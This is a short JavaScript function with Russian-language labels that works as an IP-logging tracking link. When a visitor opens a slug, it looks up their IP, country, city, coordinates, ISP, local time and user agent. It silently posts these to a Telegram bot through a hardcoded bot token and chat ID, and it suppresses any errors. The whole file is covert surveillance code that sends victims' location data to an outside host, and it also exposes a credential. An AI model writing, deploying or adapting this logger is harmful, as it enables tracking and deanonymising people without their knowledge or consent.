async function logVisitor(slug) {
  try {
    const res = await fetch("https://ipwho.is/");
    const data = await res.json();
    const ua = navigator.userAgent;

    const msg = `
<pre>
Ссылка: ${slug}
IP: ${data.ip}
Страна: ${data.country}
Город: ${data.city}
Координаты: ${data.latitude}, ${data.longitude}
Провайдер: ${data.connection?.isp}
Локальное время: ${data.timezone?.current_time}
UA: ${ua}
</pre>
`;

    await fetch("https://api.telegram.org/bot7329999473:AAEglilZMhtE6Iyr_uhLLRlI-32cIROEmNY/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: 2079893058,
        text: msg,
        parse_mode: "HTML"
      })
    });
  } catch (err) {
    console.error("Логгер не сработал", err);
  }
}
